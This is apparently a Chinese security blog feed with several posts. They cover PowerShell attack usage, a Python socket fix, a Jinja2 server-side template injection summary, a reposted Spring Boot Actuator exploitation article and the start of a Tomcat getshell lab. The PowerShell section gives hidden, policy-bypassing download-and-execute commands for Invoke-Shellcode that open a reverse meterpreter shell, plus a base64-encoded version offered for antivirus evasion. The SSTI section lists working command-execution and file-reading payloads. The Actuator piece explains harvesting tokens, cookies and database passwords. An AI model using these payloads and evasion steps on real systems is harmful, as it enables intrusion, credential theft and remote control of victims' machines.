<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PowerShell%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210925142512131.png" alt="image-20210925142512131"></p>
<p>右边是滥用函数的利用方法。</p>
<p>（2）从网站服务器中下载脚本，绕过本地权限并隐藏执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&quot;);[Parameters]</span><br></pre></td></tr></table></figure>

<p>通过浏览 <a href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">Invoke-Shellcode.ps1</a> 文件，了解如何调用反向 HTTPS meterpreter Shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PowerShell%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210925143914895.png" alt="image-20210925143914895"></p>
<p>最终代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden</span><br><span class="line">-NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&quot;);Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.1 -Lport 80</span><br></pre></td></tr></table></figure>

<p><em>参数说明（括号内为缩写形式）</em></p>
<ul>
<li><p><code>-ExecutionPolicy Bypass (-Exec Bypass)</code>：绕过执行安全策略。</p>
</li>
<li><p><code>-WindowStyle Hidden (-W Hidden)</code>：隐藏窗口</p>
</li>
<li><p><code>-NoInteractive (-NonI)</code>：非交互模式，PS 不为用户提供交互式的提示</p>
</li>
<li><p><code>-NoProfile (-NoP)</code>：PS 控制台不加载当前用户的配置文件</p>
</li>
<li><p><code>-noexit</code>：执行后不退出 Shell ，这个参数在使用键盘记录等脚本时非常重要</p>
</li>
<li><p><code>-NoLogo</code>：启动不显示版本标志的 PS</p>
</li>
</ul>
<p>（3）使用 Base64 对 PS 命令进行编码</p>
<p>使用 Base64 对 PS 命令进行编码的目的是为了混淆和压缩代码，从而避免脚本因为一些特殊字符被杀软查杀。</p>
<p>可以使用 Python 脚本对所有的 PS 命令进行 Base64 编码。下载<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">Python脚本</a>，使用 Base64 编码对其进行封装。将命令保存为文本文件，才能封装。</p>
<p>需要编码的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX(New-ObjectNet.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&quot;);Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.1 -Lport 80</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PowerShell%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210925151154686.png" alt="image-20210925151154686"></p>
<p>进行编码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ps_encoder.py -s raw.txt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/PowerShell%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20210925151246215.png" alt="image-20210925151246215"></p>
<p>远程主机上执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGUAZQB0AHoALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEMAbwBkAGUARQB4AGUAYwB1AHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAC0AUwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQApADsASQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAgAC0AUABhAHkAbABvAGEAZAAgAHcAaQBuAGQAbwB3AHMALwBtAGUAdABlAHIAcAByAGUAdABlAHIALwByAGUAdgBlAHIAcwBlAF8AaAB0AHQAcABzACAALQBMAGgAbwBzAHQAIAAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAgAC0ATABwAG8AcgB0ACAAOAAwAAoA</span><br></pre></td></tr></table></figure>

<h3 id="3-运行-32-位和-64-位-PS"><a href="#3-运行-32-位和-64-位-PS" class="headerlink" title="3. 运行 32 位和 64 位 PS"></a>3. 运行 32 位和 64 位 PS</h3><p>一些 PS 脚本只能运行在指定的平台上。</p>
<p>在 64 位的 Windows 操作系统中，存在 x64 和 x86 版本的 PS，两个版本的执行策略不会互相影响。x64 版本 PS 的配置文件在 <code>%windir%\syswow64\WindowsPowerShell\v1.0</code> 目录下。</p>
<ul>
<li>运行 32 位 PS 脚本：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure>

<ul>
<li>运行 64 位 PS 脚本：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure>

<p><a href="https://www.pstips.net/powershell-online-tutorials">powershell在线教程</a></p>
]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>Python端口复用</title>
    <url>/posts/d9e05126.html</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>OSError: [WinError 10048] 通常每个套接字地址(协议&#x2F;网络地址&#x2F;端口)只允许使用一次。</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>贴一下实例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure>

<p>设置端口可复用，保证我们每次按Ctrl+C组合键之后，快速重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">s.bind((&#x27;127.0.0.1&#x27;,8000))</span><br><span class="line">s.listen(5)</span><br></pre></td></tr></table></figure>

<p>下面这行代码就是解决套接字重复的关键。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br></pre></td></tr></table></figure>

<p>完美解决。</p>
]]></content>
      <categories>
        <category>编程随想</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI 漏洞总结</title>
    <url>/posts/51c52f90.html</url>
    <content><![CDATA[<h1 id="SSTI总结"><a href="#SSTI总结" class="headerlink" title="SSTI总结"></a>SSTI总结</h1><h2 id="一、什么是SSTI？"><a href="#一、什么是SSTI？" class="headerlink" title="一、什么是SSTI？"></a>一、什么是SSTI？</h2><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，也就是通过网站的模板引擎来渲染用户的输入，如果没有对数据进行过滤，就会造成SSTI。主要针对python、php、java的一些网站处理框架，比如<strong>Python</strong>的jinja2、mako、tornado 、django，<strong>php</strong>的smarty twig，<strong>java</strong>的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p>
<h2 id="二、漏洞场景"><a href="#二、漏洞场景" class="headerlink" title="二、漏洞场景"></a>二、漏洞场景</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210725122826408.png" alt="image-20210725122826408"></p>
<h2 id="三、利用方法"><a href="#三、利用方法" class="headerlink" title="三、利用方法"></a>三、利用方法</h2><p>官方的利用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="四、解析"><a href="#四、解析" class="headerlink" title="四、解析"></a>四、解析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</span><br><span class="line"></span><br><span class="line">__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值</span><br><span class="line"></span><br><span class="line">__subclasses__()：查看当前类的子类。</span><br><span class="line"></span><br><span class="line">__mro__:返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__init__  类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__：对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">object</span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">object.__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line">object.__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br></pre></td></tr></table></figure>

<h2 id="五、绕过"><a href="#五、绕过" class="headerlink" title="五、绕过"></a>五、绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2尝试：</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#40是file</span><br><span class="line">尝试request</span><br><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request可以用：</span><br><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br><span class="line">#request.args.是占位符，可以传递参数进去</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行命令：</span><br><span class="line">无回显：</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">#72是包含os模块的脚本</span><br><span class="line">有回显</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure>

<p><strong>小代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">num = 0 </span><br><span class="line">for i in  &#x27;&#x27;.__class__.__mro__[2].__subclasses__():</span><br><span class="line">    if &#x27;file&#x27; in str(i):</span><br><span class="line">        print num </span><br><span class="line">        print str(i)</span><br><span class="line">    else:</span><br><span class="line">        num += 1</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210725143523882.png" alt="image-20210725143523882"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">num = 0</span><br><span class="line">for item in &#x27;&#x27;.__class__.__mro__[2].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#x27;os&#x27; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+=1</span><br><span class="line">    except:</span><br><span class="line">        print &#x27;-&#x27;</span><br><span class="line">        num+=1</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/SSTI漏洞总结/image-20210725144238735.png" alt="image-20210725144238735" style="zoom:50%;" />

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Springboot之actuator配置不当的漏洞利用</title>
    <url>/posts/cb7808c4.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://www.freebuf.com/news/193509.html">https://www.freebuf.com/news/193509.html</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p><strong>Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的，然而关于 springboot 框架下 actuator 配置不当的漏洞利用分析文章很少，目前笔者只在先知社区看到有一篇介绍 actuator 的安全文章，于是想在这里，分享下笔者在渗透测试过程中遇到的 actuator 配置不当的发现及利用过程，如有分析不正确的地方，还请各位大佬轻喷~</strong>   </p>
<h2 id="Actuator-简介"><a href="#Actuator-简介" class="headerlink" title="Actuator 简介"></a><strong>Actuator 简介</strong></h2><p>如上所言，actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：       </p>
<table>
<thead>
<tr>
<th align="center">Http 方法</th>
<th align="center">路径</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">get</td>
<td align="center">&#x2F;autoconfig</td>
<td align="center">提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;configprops</td>
<td align="center">描述配置属性（包含默认值）如何注入 Bean</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;beans</td>
<td align="center">描述应用程序上下文里全部的 Bean，以及它们的关系</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;dump</td>
<td align="center">获取线程活动的快照</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;env</td>
<td align="center">获取全部环境属性</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;env&#x2F;{name}</td>
<td align="center">根据名称获取特定的环境属性值</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;health</td>
<td align="center">报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;info</td>
<td align="center">获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;mappings</td>
<td align="center">描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;metrics</td>
<td align="center">报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;metrics&#x2F;{name}</td>
<td align="center">报告指定名称的应用程序度量值</td>
</tr>
<tr>
<td align="center">post</td>
<td align="center">&#x2F;shutdown</td>
<td align="center">关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
</tr>
<tr>
<td align="center">get</td>
<td align="center">&#x2F;trace</td>
<td align="center">提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
</tr>
</tbody></table>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a><strong>漏洞发现</strong></h2><p> 一般来说，笔者挖掘 actuator 配置不当的漏洞分如下两步：1. 识别当前 web 应用使用的框架为 springboot 框架；2. 枚举执行器端点路径；下面针对这两步结合笔者漏洞挖掘中遇到的实例具体来说说。</p>
<p>\1. 识别当前 web 应用使用的框架为 springboot 框架。主要有两个方法判断：</p>
<p>①通过 web 应用程序网页标签的图标（favicon.ico）；如果 web 应用开发者没有修改 springboot web 应用的默认图标，那么进入应用首页后可以看到如下默认的绿色小图标：   </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546486996_5c2d84d43c550.png!small" alt="img">该绿色小图标是 spring 框架下的一个默认图标，尽管不能百分百就此图标确认当前 web 应用使用的是 springboot 框架，但是基本上也能百分之八十确认该 web 应用是使用 springboot 框架开发的了（毕竟 springboot 框架确实是太流行了)。  </p>
<p>②通过 springboot 框架默认报错页面；如果 web 应用开发者没有修改 springboot web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下（此处仅以 404 报错页面为例）：   </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546487551_5c2d86ffcaa58.png!small" alt="img">当出现如上报错页面，就能确定当前 web 应用是使用了 springboot 框架的。  </p>
<p>那么综合以上两个途径来判断当前 web 应用是否是 springboot 框架，就是通过访问不同的目录，看是否有小绿叶图标，然后就是想办法在不同目录下触发应用程序的 4xx 或 5xx 错误，看是否有 Whitelabel Error Page 报错。  </p>
<p>\2. 枚举执行器端点路径。这个其实很简单，在确认当前 web 站点是 springboot 框架后，枚举当前站点的所有一级、二级甚至三级目录，然后写脚本对每个目录进行探测，查看目录下是否存在 actuator 执行端点路径即可。（本来想写个比较通用的探测脚本的，现在只有延期了.. 写完之后放出来）    </p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><p>通过如上步骤，如果你发现了 actuator 的配置不当漏洞，那就要恭喜你啦。不过，尽管这些监控信息的泄露已经足够高危了，有时候碰到一些比较严格的厂商，需要你证明一下这些监控信息的具体危害，或者你想要将危害等级提升到严重，或者想要通过这些监控信息进一步挖掘其他漏洞，该怎么利用呢？笔者通过自身的踩坑经历，总结了如下几个点来尽可能最大化的利用该漏洞：     </p>
<p><strong>①认证字段的获取以证明可影响其他用户；</strong>这个主要通过访问&#x2F;trace 路径获取用户认证字段信息，比如如下站点存在 actuator 配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP 头等），还有用户 token、cookie 字段：       </p>
<p>trace 路径：       </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546488903_5c2d8c47c05f7.png!small" alt="img">用户认证字段泄露：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546489012_5c2d8cb45a12b.png!small" alt="img"></p>
<p>通过替换 token 字段可获取其他用户的信息：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546489085_5c2d8cfddb7cf.png!small" alt="img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546489162_5c2d8d4a9088e.png!small" alt="img"><strong>②数据库账户密码泄露；</strong>由于 actuator 会监控站点 mysql、mangodb 之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb 数据库；这个主要通过&#x2F;env 路径获取这些服务的配置信息，比如如下站点存在 actuator 配置不当漏洞，通过其&#x2F;env 路径，可获得 mysql、mangodb 的用户名及密码：       </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546489556_5c2d8ed4ab5a5.png!small" alt="img">mangodb 及 mysql 都可直连，此处以 mysql 为例：       </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546489616_5c2d8f10e0e1d.png!small" alt="img">该漏洞详情请见<a href="https://dvpnet.io/info/detail/id/814%EF%BC%8C%E6%98%AF%E7%AC%94%E8%80%85%E5%8E%BB%E5%B9%B4%E5%9C%A8">https://dvpnet.io/info/detail/id/814，是笔者去年在</a> dvp 平台提交的一个漏洞。一旦数据库外连成功，漏洞分分钟高危变严重啊。      </p>
<p><strong>③git 项目地址泄露；</strong>这个一般是在&#x2F;health 路径，比如如下站点，访问其 health 路径可探测到站点 git 项目地址：       </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546489858_5c2d90020369c.png!small" alt="img"></p>
<p>直接访问 git 项目地址，可拿下源码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Springboot%E4%B9%8Bactuator%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1546489930_5c2d904a86e18.png!small" alt="img"><strong>④后台用户账号密码泄露；</strong>这个一般是在&#x2F;heapdump 路径下，访问&#x2F;heapdump 路径，返回 GZip 压缩 hprof 堆转储文件。在 Android studio 打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码（包含漏洞的图片暂时没得，大家记住思路就好了..)，通过泄露的账号密码，然后进入后台一番轰炸也不错的。  </p>
<h2 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a><strong>安全措施</strong></h2><p>引入 security 依赖，打开安全限制并进行身份验证；同时设置单独的 Actuator 管理端口并配置不对外网开放。详情请见先知社区<a href="https://xz.aliyun.com/t/2233">https://xz.aliyun.com/t/2233</a>   </p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a><strong>参考文献</strong></h2><p>1.<a href="https://xz.aliyun.com/t/2233">https://xz.aliyun.com/t/2233</a></p>
<p>2.<a href="https://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#production-ready">https://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#production-ready</a></p>
<p>3.<a href="https://blog.csdn.net/qq_20325039/article/details/79822141">https://blog.csdn.net/qq_20325039/article/details/79822141</a></p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>Springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat 弱口令+war部署getshell</title>
    <url>/posts/b0379212.html</url>
    <content><![CDATA[<h1 id="Tomcat弱口令爆破-war部署getshell"><a href="#Tomcat弱口令爆破-war部署getshell" class="headerlink" title="Tomcat弱口令爆破+war部署getshell"></a>Tomcat弱口令爆破+war部署getshell</h1><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><blockquote>
<p>Tomcat全版本</p>
</blockquote>
<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><ol>
<li>git 拉取资源</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>

<p>进入目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/vulhub/tomcat/tomcat8</span><br></pre></td></tr></table></figure>

<p>由于这个镜像启动后登录管理页面存在重复验证的问题，这里不再利用docker-compose.yml</p>
<ol start="2">
<li>docker 拉取镜像</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull docker.io/vulhub/tomcat:8.0</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>运行镜像</li>
</ol>
